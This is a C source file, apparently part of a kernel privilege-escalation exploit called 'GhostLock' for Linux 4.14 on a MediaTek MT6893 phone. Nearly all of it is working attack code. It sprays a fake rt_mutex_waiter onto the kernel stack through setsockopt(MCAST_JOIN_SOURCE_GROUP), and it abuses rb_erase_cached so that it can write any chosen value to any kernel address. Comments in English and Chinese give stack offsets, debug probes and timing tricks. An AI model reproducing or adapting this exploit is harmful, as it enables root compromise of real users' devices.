/* MCAST source-group transport for GhostLock ares (4.14.186, MT6893)
 * Geometry (iQOO-kit baseline, S = syscall handler entry SP):
 *   futex: SyS_futex 0x70 + do_futex 0x1b0 ; rt_waiter = x29-0xc0 => S-0x190
 *   mcast: SyS_setsockopt -0x50 + sock_common_setsockopt 0x10
 *          + tcp_setsockopt 0x10 + ip_setsockopt 0x30
 *          + do_ip_setsockopt 0x190 ; copy dest = do_ip sp+0x20
 *          => buffer = S-0x210  =>  WAITER_OFF = 0x80
 */
#include "common.h"
#include "runtime_offsets.h"
#include <netinet/in.h>
#define MCAST_BUF_LEN 0x108
#define MCAST_OFF_DEFAULT 0x70
#define MCAST_ATTEMPTS 64
#ifndef MCAST_JOIN_SOURCE_GROUP
#define MCAST_JOIN_SOURCE_GROUP 46
#endif
int mcast_route_selected(void){
  const char *r=getenv("GHOSTLOCK_ROUTE");
  if(r&&*r) return strcmp(r,"mcast")==0;
  const char *m=getenv("GHOSTLOCK_MCAST_ROUTE");
  return m&&*m&&strcmp(m,"0")!=0;
}
void do_mcast_fake_lock_route(void){
  if(!page_base||!fake_lock||!fake_fops){pr_error("mcast: no page\n");return;}
  int fd=socket(AF_INET,SOCK_DGRAM|SOCK_CLOEXEC,0);
  if(fd<0){pr_error("mcast socket errno=%d\n",errno);return;}
  uint64_t relink_pc=fake_right?fake_right:fake_parent;
  uint64_t relink_left=fake_right?pselect_custom_target:fake_left;
  int obs=env_flag("GHOSTLOCK_OBSERVE",0);
  int off=env_int_range("GHOSTLOCK_MCAST_OFF",MCAST_OFF_DEFAULT,0,0x108);
  int pc0=env_flag("GHOSTLOCK_MCAST_PC0",0);
  int bad=env_flag("GHOSTLOCK_BADLEFT",0);
  atomic_store(&punch_consume_stop,0);
  atomic_store(&punch_consume_go,0);
  atomic_store(&consumer_calls,0);
  atomic_store(&consumer_success,0);
  atomic_store(&main_route_delay_usec,0);
  pr_info("mcast enter off=0x%x pc0=%d bad=%d page=%016zx lock=%016zx pc=%016zx left=%016zx\n",
          off,pc0,bad,page_base,fake_lock,(size_t)relink_pc,(size_t)relink_left);
  /* MC_PROBE: 0=正常(write fake_lock) 1=把 waiter->lock 写成 0xdeadbeef
   * 2=把 waiter->task 写成 0xdeadbeef 3=把 waiter->prio 写成 0x7fffffff
   * 用于区分「stamp 真的命中」和「mcast 自己崩了」。 */
  int probe=env_int_range("GHOSTLOCK_MC_PROBE",0,0,6);
  /* MC_CLEAN_FIRE=1: 最后一次 setsockopt 之后零系统调用，直接触发 consumer。
   * 原因：ckpt_val/ckpt_begin 内部会 write()+fsync()，都是系统调用，
   * 会复用本线程内核栈，把刚 stamp 进 rt_waiter 的值冲掉。 */
  int clean_fire=env_flag("MC_CLEAN_FIRE",0);
  int fire_at=env_int_range("MC_FIRE_AT",4,1,MCAST_ATTEMPTS);
  ckpt_val("mc_enter",1);
  ckpt_val("mc_off",(long)off);
  ckpt_val("mc_probe",(long)probe);
  ckpt_val("mc_buf_len",(long)MCAST_BUF_LEN);
  ckpt_val("mc_off_lock",(long)(off+0x38));
  ckpt_val("mc_off_prio",(long)(off+0x40));
  ckpt_val("mc_clean_fire",(long)clean_fire);
  ckpt_val("mc_fire_at",(long)fire_at);
  unsigned char buf[MCAST_BUF_LEN];
  int route_ok=0, eaddr=0, other=0;
  for(int i=1;i<=MCAST_ATTEMPTS&&!route_ok;i++){
    int cb=atomic_load(&consumer_calls);
    memset(buf,0,sizeof(buf));
    if((size_t)off+0x50<=sizeof(buf)){
      if(mcast_slide_mode){
        /* B-mode SLIDE write.  rb_erase_cached branch 0x5838 does
         *     *(node->rb_left) = node->__rb_parent_color
         * so {pc=value, right=0, left=target} writes *(target)=value.
         * Both operands are direct-map aliases => no KASLR required. */
        uint64_t v = (uint64_t)mcast_slide_value;
        uint64_t t = (uint64_t)mcast_slide_target;
        put64(buf,off+0x00,v);
        put64(buf,off+0x08,0);
        put64(buf,off+0x10,t);
        put64(buf,off+0x18,v);
        put64(buf,off+0x20,0);
        put64(buf,off+0x28,t);
        put64(buf,off+0x30,fake_task);
        put64(buf,off+0x38,fake_lock);
        put32(buf,off+0x40,FAKE_WAITER_PRIO);
        put32(buf,off+0x44,0);
        put64(buf,off+0x48,0);
      } else {
      /* 4.14 rt_mutex_waiter: tree 0x00 / pi_tree 0x18 / task 0x30 /
       * lock 0x38 / prio 0x40 / deadline 0x48.
       * Leaf rb shape {pc = target-8, right = 0, left = 0} makes
       * rb_erase_cached store *(pc & ~3) + 8) = rb_right = 0, i.e.
       * *(target) = 0, then early-return on parent == 0. */
      uint64_t leaf_pc = (uint64_t)(pselect_custom_target - 8);
      put64(buf,off+0x00, bad?0xdeadbeefdeadbeefULL:leaf_pc);
      put64(buf,off+0x08,0);
      put64(buf,off+0x10,0);
      put64(buf,off+0x18, pc0?0:leaf_pc);
      put64(buf,off+0x20,0);
      put64(buf,off+0x28,0);
      put64(buf,off+0x30,fake_task);
      put64(buf,off+0x38,fake_lock);
      put32(buf,off+0x40,FAKE_WAITER_PRIO);
      put32(buf,off+0x44,0);
      put64(buf,off+0x48,0);
      }
    }
    if(probe==1) put64(buf,off+0x38,0xdeadbeefdeadbeefULL); /* waiter->lock */
    else if(probe==2) put64(buf,off+0x30,0xdeadbeefdeadbeefULL); /* waiter->task */
    else if(probe==3) put32(buf,off+0x40,0x7fffffffu); /* waiter->prio */
    else if(probe==5){ /* ★早退判据：将 waiter->prio 写成 task->prio。
      * rt_mutex_waiter_equal 只比 prio，相等则 rt_mutex_adjust_pi 在
      * rtmutex.c:1135 直接 return，整条 PI chain walk 不发生 → 不崩。
      * 该判据只读 waiter->prio（栈上），完全不碰 waiter->lock，
      * 因此不受 fake_lock 页是否有效影响。 */
      int tp=env_int_range("GHOSTLOCK_TASK_PRIO",120,0,200);
      put32(buf,off+0x40,tp);
      put32(buf,off+0x44,0);
    }
    else if(probe==6){ /* 同上，但把 deadline 也写成 0 以防 dl_prio 分支 */
      int tp=env_int_range("GHOSTLOCK_TASK_PRIO",120,0,200);
      put32(buf,off+0x40,tp);
      put64(buf,off+0x48,0);
    }
    else if(probe==4){ /* 全区间覆盖：整个 buf 填 0xdeadbeef。
      * 若 buf 与 rt_waiter 有任何重叠，PI walk 必读垃圾，崩溃形态必变。
      * 若形态完全不变 → buf 与 rt_waiter 不重叠，几何彻底错。 */
      for(size_t z=0; z<sizeof(buf); z+=8) put64(buf,z,0xdeadbeefdeadbeefULL);
    }
    if(i==1){
      ckpt_val("mc_buf_task",(long)(*(uint64_t*)(void*)(buf+off+0x30)));
      ckpt_val("mc_buf_lock",(long)(*(uint64_t*)(void*)(buf+off+0x38)));
      ckpt_val("mc_buf_prio",(long)(*(uint32_t*)(void*)(buf+off+0x40)));
    }
    errno=0;
    ckpt_val("mc_iter",(long)i);
    if(clean_fire && i==fire_at && env_flag("MC_NO_STAMP",0)){
      /* ===== 无 stamp 基线对照 =====
       * 完全不调用 setsockopt，等价于「什么也不写」。
       * 此时栈上 rt_waiter 保持 task_blocks_on_rt_mutex 写入的原值：
       *   waiter->prio = task->prio (阻塞当时实测 = 120), waiter->lock = f_pi_chain
       * 若 rt_mutex_adjust_pi 的 task->prio 也是 120 => 早退 => 不崩
       * 判据：
       *   不崩 => baseline 本来不崩 => 之前的崩溃确由 stamp 引起 => 几何正确(铁证)
       *   仍崩 => baseline 就崩 => 崩溃与 stamp 无关, 之前所有几何推导都是无关变量
       */
      ckpt_val("mc_no_stamp",(long)i);
      ckpt_val("mc_nostamp_off",(long)off);
      atomic_store(&punch_consume_go,i);
      for(int s2=0;s2<20000000;s2++){ if(atomic_load(&consumer_calls)>cb)break; __asm__ volatile("yield":::"memory"); }
      for(int s2=0;s2<20000000;s2++) __asm__ volatile("yield":::"memory");
      atomic_store(&punch_consume_go,0);
      int cc2=atomic_load(&consumer_calls);
      ckpt_val("mc_nostamp_calls",(long)cc2);
      if(cc2>cb) route_ok=1;
      break;
    }
    if(clean_fire && i==fire_at){
      /* ===== 干净触发路径 =====
       * 所有 ckpt 在 setsockopt 之前完成；setsockopt 返回后立刻 atomic_store
       * 触发 consumer，中间不做任何系统调用（atomic_store 是用户态内存操作）。
       * errno 读取是 TLS 访问，也不是系统调用。 */
      ckpt_val("mc_pre_off_lock",(long)(off+0x38));
      ckpt_val("mc_pre_buf_lock",(long)(*(uint64_t*)(void*)(buf+off+0x38)));
      ckpt_val("mc_pre_buf_task",(long)(*(uint64_t*)(void*)(buf+off+0x30)));
      ckpt_val("mc_pre_buf_prio",(long)(*(uint32_t*)(void*)(buf+off+0x40)));
      ckpt_val("mc_about_to_stamp",(long)i);
      int cret=setsockopt(fd,IPPROTO_IP,MCAST_JOIN_SOURCE_GROUP,buf,sizeof(buf));
      int cse=errno;                     /* TLS 读取，无系统调用 */
      atomic_store(&punch_consume_go,i); /* ★ 紧接 stamp，零系统调用 */
      for(int s=0;s<20000000;s++){ if(atomic_load(&consumer_calls)>cb)break; __asm__ volatile("yield":::"memory"); }
      for(int s=0;s<20000000;s++) __asm__ volatile("yield":::"memory");
      atomic_store(&punch_consume_go,0);
      int cc=atomic_load(&consumer_calls);
      ckpt_val("mc_clean_ret",(long)cret);
      ckpt_val("mc_clean_errno",(long)cse);
      ckpt_val("mc_clean_calls",(long)cc);
      if(cc>cb) route_ok=1;
      break;
    }
    ckpt_begin("mc_setsockopt");
    int ret=setsockopt(fd,IPPROTO_IP,MCAST_JOIN_SOURCE_GROUP,buf,sizeof(buf));
    ckpt_end("mc_setsockopt");
    int se=errno;
    ckpt_val("mc_ret",(long)ret);
    ckpt_val("mc_errno",(long)se);
    if(se==EADDRNOTAVAIL) eaddr++; else if(ret!=0) other++;
    if(obs){ if(i<=4) pr_info("mcast obs seq=%d ret=%d errno=%d\n",i,ret,se); if(i>=16)break; continue; }
    if(i>=4&&(ret==0||se==EADDRNOTAVAIL)){
      ckpt_val("mc_fire_seq",(long)i);
      atomic_store(&punch_consume_go,i);
      for(int s=0;s<4000000;s++){ if(atomic_load(&consumer_calls)>cb)break; __asm__ volatile("yield":::"memory"); }
      for(int s=0;s<4000000;s++) __asm__ volatile("yield":::"memory");
      atomic_store(&punch_consume_go,0);
      int c=atomic_load(&consumer_calls);
      int su=atomic_load(&consumer_success);
      ckpt_val("mc_consumer_calls",(long)c);
      if(c>cb){ pr_info("mcast won seq=%d calls=%d success=%d\n",i,c,su); route_ok=1; }
    }
  }
  atomic_store(&punch_consume_go,0);
  atomic_store(&punch_consume_stop,1);
  close(fd);
  ckpt_val("mc_done",1);
  pr_info("mcast done ok=%d off=0x%x eaddr=%d other=%d calls=%d success=%d\n",
          route_ok,off,eaddr,other,atomic_load(&consumer_calls),atomic_load(&consumer_success));
}
